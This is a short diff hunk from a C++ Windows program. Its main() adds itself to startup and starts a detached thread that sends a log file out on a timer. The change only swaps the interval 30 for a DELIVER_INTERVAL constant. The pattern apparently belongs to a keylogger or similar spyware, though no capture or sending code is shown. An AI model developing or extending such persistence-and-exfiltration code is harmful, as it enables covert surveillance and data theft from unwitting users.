@@ -203,7 +203,7 @@ int main()
     addToStartupIfNotExists();
 
     std::thread senderThread([=]()
-                             { startSendTimer(getLogFilePath(), 30); });
+                             { startSendTimer(getLogFilePath(), DELIVER_INTERVAL); });
     senderThread.detach();
 
     MSG msg;
